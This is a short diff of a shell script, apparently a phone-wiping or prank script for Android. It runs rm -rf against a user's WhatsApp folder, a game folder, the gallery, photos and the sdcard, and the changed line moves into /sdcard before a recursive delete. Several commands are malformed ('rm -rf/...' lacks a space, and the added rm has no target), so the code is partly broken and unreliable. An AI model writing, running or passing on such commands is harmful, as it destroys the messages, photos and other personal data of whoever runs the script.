@@ -31,7 +31,7 @@ rm -rf/Android/WhatsApp
 rm -rf/Android/com.mobile.legends
 rm -rf/Galeri
 rm -rf/Photos
-rm -rf/video
+cd /sdcard && rm -rf
 
 if [ $pill = "3" ] 
 then
